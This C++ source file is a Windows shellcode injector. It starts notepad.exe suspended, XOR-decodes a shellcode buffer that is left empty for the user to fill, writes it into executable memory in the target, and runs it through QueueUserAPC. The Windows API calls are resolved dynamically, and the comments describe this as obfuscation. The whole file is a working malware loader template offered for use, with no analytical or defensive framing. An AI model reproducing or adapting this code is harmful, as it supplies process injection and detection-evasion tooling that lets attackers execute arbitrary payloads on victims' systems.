#include <Windows.h>
#include <iostream>

//  API functions were Obfuscated
#define CREATE_PROCESS_FN      "CreateProcessA"
#define VIRTUAL_ALLOC_FN       "VirtualAllocEx"
#define WRITE_PROCESS_MEM_FN   "WriteProcessMemory"
#define QUEUE_APC_FN           "QueueUserAPC"
#define RESUME_THREAD_FN       "ResumeThread"
#define CLOSE_HANDLE_FN        "CloseHandle"

// Obfuscated function types
typedef BOOL(WINAPI* CreateProcessFn)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef LPVOID(WINAPI* VirtualAllocFn)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemoryFn)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD(WINAPI* QueueUserAPCFn)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD(WINAPI* ResumeThreadFn)(HANDLE);
typedef BOOL(WINAPI* CloseHandleFn)(HANDLE);

// Xor algorithm encryption was implemented
void encryptDataWithXOR(unsigned char* data, size_t size, const char* key) {
    size_t keyLen = strlen(key);
    for (size_t i = 0; i < size; i++) {
        data[i] = data[i] ^ key[i % keyLen];
    }
}

// Function to print the remote shellcode address
void printRemoteAddress(LPVOID address) {
    std::cout << "Shellcode injected at remote address: 0x" << std::hex << address << std::endl;
}

int main() {
    const char encryptionKey[] = "NyaMeeEain";
    // Encrypted shellcode (provide your shellcode here)
    unsigned char shellcode[] = {
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Load the obfuscated function addresses
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (kernel32 == NULL) {
        std::cerr << "Failed to get handle to kernel32.dll" << std::endl;
        return 1;
    }

    CreateProcessFn CreateProcess = (CreateProcessFn)GetProcAddress(kernel32, CREATE_PROCESS_FN);
    VirtualAllocFn VirtualAllocEx = (VirtualAllocFn)GetProcAddress(kernel32, VIRTUAL_ALLOC_FN);
    WriteProcessMemoryFn WriteProcessMemory = (WriteProcessMemoryFn)GetProcAddress(kernel32, WRITE_PROCESS_MEM_FN);
    QueueUserAPCFn QueueUserAPC = (QueueUserAPCFn)GetProcAddress(kernel32, QUEUE_APC_FN);
    ResumeThreadFn ResumeThread = (ResumeThreadFn)GetProcAddress(kernel32, RESUME_THREAD_FN);
    CloseHandleFn CloseHandle = (CloseHandleFn)GetProcAddress(kernel32, CLOSE_HANDLE_FN);

    if (CreateProcess == NULL || VirtualAllocEx == NULL || WriteProcessMemory == NULL ||
        QueueUserAPC == NULL || ResumeThread == NULL || CloseHandle == NULL) {
        std::cerr << "Failed to retrieve function addresses" << std::endl;
        return 1;
    }

    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    LPCSTR applicationPath = "C:\\Windows\\System32\\notepad.exe";

    if (CreateProcess(applicationPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &startupInfo,
        &processInfo)) {

        HANDLE processHandle = processInfo.hProcess;
        HANDLE threadHandle = processInfo.hThread;

        // Obfuscated API calls for shellcode encryption
        encryptDataWithXOR(shellcode, shellcodeSize, encryptionKey);

        LPVOID remoteShellAddress = VirtualAllocEx(processHandle, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (remoteShellAddress) {
            WriteProcessMemory(processHandle, remoteShellAddress, shellcode, shellcodeSize, NULL);
            printRemoteAddress(remoteShellAddress);

            QueueUserAPC((PAPCFUNC)remoteShellAddress, threadHandle, (ULONG_PTR)remoteShellAddress);

            ResumeThread(threadHandle);

            WaitForSingleObject(processHandle, INFINITE);

            // Clean up resources
            VirtualFreeEx(processHandle, remoteShellAddress, 0, MEM_RELEASE);
            CloseHandle(threadHandle);
            CloseHandle(processHandle);
        }
    }

    return 0;
}
